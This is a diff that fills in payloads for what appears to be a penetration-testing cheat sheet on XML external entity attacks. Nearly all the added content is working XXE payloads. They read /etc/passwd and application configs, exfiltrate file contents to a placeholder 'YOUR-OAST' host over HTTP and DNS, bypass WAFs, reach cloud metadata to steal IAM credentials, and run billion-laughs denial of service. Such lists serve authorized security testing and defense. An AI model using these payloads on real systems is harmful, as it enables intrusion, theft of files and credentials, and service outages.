@@ -45,20 +45,63 @@ In-band XXE returns the entity value directly in the application response. This 
 
 ### Basic File Read
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+```
 
 ### Read Application Configuration
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
+]>
+<root>&xxe;</root>
+```
+
+For Java apps:
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///WEB-INF/web.xml">
+]>
+<root>&xxe;</root>
+```
 
 ### Read Windows System Files
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+]>
+<root>&xxe;</root>
+```
 
 ### Read Java Application Properties
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<config>&xxe;</config>
+```
 
 ### Test for Vulnerability
 
 Send this as a canary payload — if the parser resolves it, XXE is confirmed:
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://YOUR-OAST/canary-xxe-test">
+]>
+<root>&xxe;</root>
+```
 
 If the response contains the test value or no XML parsing error, the parser likely processes external entities.
 
@@ -68,26 +111,76 @@ When the application does not return XML entity values in its response, exfiltra
 
 ### HTTP Callback Exfiltration
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://YOUR-OAST/exfil.dtd">
+  %xxe;
+]>
+<root>&send;</root>
+```
 
 Host the DTD on your OAST server (`YOUR-OAST`):
 
+```xml
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param "<!ENTITY send SYSTEM 'http://YOUR-OAST/?data=%data;'>">
+%param;
+```
 
 ### Single-Payload Blind XXE (No External DTD)
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &quot;exfil&quot; SYSTEM 'http://YOUR-OAST/?data=%xxe;'>">
+  %eval;
+]>
+<root>&exfil;</root>
+```
 
 ### DNS Exfiltration (When HTTP Outbound Is Blocked)
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://YOUR-OAST/dns-exfil.dtd">
+  %dtd;
+]>
+<root>&send;</root>
+```
 
 The DNS DTD forces the parser to resolve a subdomain encoding the file contents:
 
+```xml
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param "<!ENTITY send SYSTEM 'http://%data;.YOUR-OAST/'>">
+%param;
+```
 
 ### Blind XXE with Error-Based Leak
 
 If callback exfiltration is blocked, trigger an error that leaks data:
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &quot;error&quot; SYSTEM 'file:///nonexistent/%file;'>">
+  %eval;
+]>
+<root>&error;</root>
+```
 
 Host the error DTD:
 
+```xml
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param "<!ENTITY &quot;error&quot; SYSTEM 'file:///nonexistent/%data;'>">
+%param;
+```
 
 The "file not found" error message in the response may contain the file contents.
 
@@ -97,16 +190,51 @@ SVG files are XML. Injecting XXE payloads into SVG uploads can achieve code exec
 
 ### Basic SVG XXE
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <text x="10" y="50" font-size="16">&xxe;</text>
+</svg>
+```
 
 ### Blind SVG XXE via Image Rendering
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://YOUR-OAST/svg-exfil">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <circle cx="50" cy="50" r="40" fill="red"/>
+  <image href="&xxe;"/>
+</svg>
+```
 
 ### SVG with External Image (SSRF + XXE)
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <text>&xxe;</text>
+</svg>
+```
 
 ### SVG with XInclude (No DOCTYPE Control)
 
 When the parser blocks DOCTYPE declarations but still processes XInclude:
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</svg>
+```
 
 
 ### SVG Upload Checks
@@ -124,11 +252,46 @@ SOAP messages are XML by definition. Target the SOAP body or envelope with XXE.
 
 ### SOAP Body XXE
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <getUser>
+      <name>&xxe;</name>
+    </getUser>
+  </soap:Body>
+</soap:Envelope>
+```
 
 ### WS-Federation SAML Assertion XXE
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE Assertion [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
+  <saml:Subject>
+    <saml:NameID>&xxe;</saml:NameID>
+  </saml:Subject>
+</saml:Assertion>
+```
 
 ### SOAP with OOB Exfiltration
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://YOUR-OAST/soap-exfil.dtd">
+  %xxe;
+]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>&send;</soap:Body>
+</soap:Envelope>
+```
 
 
 ## Parameter Entity XXE
@@ -137,25 +300,67 @@ Parameter entities (`%name`) are resolved within the DTD subset. They bypass res
 
 ### Basic Parameter Entity
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY test "%xxe;">
+]>
+<root>&test;</root>
+```
 
 ### Parameter Entity with External DTD
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://YOUR-OAST/param.dtd">
+  %xxe;
+]>
+<root>&send;</root>
+```
 
 External DTD (`http://YOUR-OAST/param-dtd`):
 
+```xml
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param "<!ENTITY send SYSTEM 'http://YOUR-OAST/?data=%data;'>">
+%param;
+```
 
 ### Parameter Entity to Bypass WAF
 
 WAFs often scan for `<!ENTITY` in the internal subset. Parameter entities allow you to move entity declarations into an external DTD, evading the WAF:
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://YOUR-OAST/waf-bypass.dtd">
+  %xxe;
+]>
+<root>&send;</root>
+```
 
 External DTD:
+
+```xml
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY send SYSTEM 'http://YOUR-OAST/?d=%data;'>">
+%param1;
+```
 
 
 ## Filter Bypass Techniques
 
 ### PHP `php://filter` (Read Base64-Encoded Source)
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
+]>
+<root>&xxe;</root>
+```
 
 Decode the Base64 output to recover the PHP source code.
 
@@ -163,6 +368,12 @@ Decode the Base64 output to recover the PHP source code.
 
 If the parser expects UTF-7 but the WAF only scans for ASCII:
 
+```xml
+<?xml version="1.0" encoding="UTF-7"?>
++ADw-?xml version+ADs- +ACI-1.0+ACI- encoding+ADs- +ACI-UTF-7+ACI-+AD4-
++ADw-!DOCTYPE foo +AFs- +ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-
++ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-
+```
 
 Note: UTF-7 bypass is rarely effective against modern parsers but useful for legacy systems.
 
@@ -170,21 +381,52 @@ Note: UTF-7 bypass is rarely effective against modern parsers but useful for leg
 
 Prepend a UTF-8 BOM (`EF BB BF`) before the XML declaration to bypass parsers that only check the first bytes for `<?xml`:
 
+```
+\xEF\xBB\xBF<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+```
 
 ### CDATA Wrapping Bypass
 
 When input filtering blocks `<` or `>` characters, wrap the payload in a CDATA section:
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root><![CDATA[&xxe;]]></root>
+```
 
 ### Double Encoding
 
 If the application URL-decodes but the parser decodes again:
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>%26xxe;</root>
+```
 
 ### XML Schema Validation Bypass
 
 When a strict XSD is enforced, inject XXE into fields that accept free-text:
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<user xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+      xsi:noNamespaceSchemaLocation="user.xsd">
+  <name>&xxe;</name>
+</user>
+```
 
 If all fields are validated, try injecting the DOCTYPE between the XML declaration and root element — some parsers still process it.
 
@@ -194,14 +436,43 @@ XXE can be used to make the server initiate HTTP requests to internal resources.
 
 ### Basic SSRF via XXE
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://internal-service/secret">
+]>
+<root>&xxe;</root>
+```
 
 ### SSRF to Cloud Metadata
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<root>&xxe;</root>
+```
 
 AWS IAM credentials from metadata:
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+]>
+<root>&xxe;</root>
+```
 
 ### SSRF to Internal Services
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
+]>
+<root>&xxe;</root>
+```
 
 
 Common internal targets:
@@ -217,13 +488,52 @@ XML entity expansion attacks consume memory exponentially. This is a denial-of-s
 
 ### Classic Billion Laughs
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<root>&lol9;</root>
+```
 
 This expands `&lol;` 10^9 times, consuming ~3 GB of memory.
 
 ### Quadrillion Laughs
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+]>
+<root>&lol6;</root>
+```
 
 ### Internal Entity Expansion (No External Entities)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY a "aaa">
+  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
+]>
+<root>&e;</root>
+```
 
 
 **Warning:** Billion Laughs attacks cause real damage. Only use against targets you have explicit authorization to test. Document impact as a DoS finding with severity rating.
